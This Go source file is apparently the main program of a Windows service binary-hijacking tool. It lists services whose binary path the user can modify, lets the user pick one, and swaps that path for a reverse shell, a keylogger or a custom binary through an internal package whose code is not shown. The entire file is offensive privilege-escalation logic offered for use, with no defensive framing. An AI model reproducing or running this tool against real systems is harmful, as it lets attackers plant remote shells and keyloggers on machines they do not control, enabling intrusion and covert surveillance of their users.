package main

import (
	"fmt"

	"os"

	"github.com/Luke5080/win-binary-hijacking/internal/enumwin"
	"github.com/fatih/color"
)

func main() {
	// Setting up all variables we need
	// variables to hold user input
	// slice to hold user options and the
	// user homedir

	var userChoice, binaryChoice int

	binaryOptions := [3]string{"Reverse Shell", "Key logger", "Custom binary"}

	homeDir, _ := os.UserHomeDir()

	// Slice holding of type *enum.WeakServ to display
	// choice of services that are exploitable to the user.
	var userOptions []*enumwin.WeakServ

	m := enumwin.SetMenu()

	text, err := os.ReadFile(homeDir + `\win-binary-hijacking\internal\banner\banner.txt`)

	if err != nil {
		m.CT.Println("Could not read banner: ", err)
	}

	m.CD.Println(string(text))

	m.CT.Println("Author: Luke Marshall")

	chanBack := enumwin.EnumServ()

	// Itterate through values in returned channel
	// and append them to the userOptions slice
	for val := range chanBack {
		userOptions = append(userOptions, val)
	}

	if len(userOptions) > 0 {
		m.CG.Println("\n\nCan Modify the following services:")

		// Display each entry in the userOptions slice
		// as well as their index to provide menu of
		// options for the user
		for index, val := range userOptions {
			m.CD.Printf("%d: %s\n", index+1, val.Name)
		}

		m.CT.Println("\n\nChoose a service to modify:")

		r, err := fmt.Scanln(&userChoice)

		// Error handling for user choice input
		// Personal Notes: Scanln returns number of
		// succesfully read arguments and err
		// If arguments read = 0 or err != nil
		// Ask for input again. Similarily, if
		// user choice is not an index of the
		// the the userOptions slice, ask again
		for r != 1 || err != nil || userChoice > len(userOptions) || userChoice <= 0 {
			r, err = fmt.Scanln(&userChoice)
		}

		color.Red("\nWhat binary would you like to replace the service binary with?\n")

		for index, val := range binaryOptions {
			m.CT.Printf("%d: %s\n", index+1, val)
		}

		fmt.Scanln(&binaryChoice)

		for r != 1 || err != nil || binaryChoice > len(binaryOptions) || binaryChoice <= 0 {
			r, err = fmt.Scanln(&binaryChoice)
		}

		enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice)

	} else {
		m.CT.Println("No services found which you can modify")
	}

}
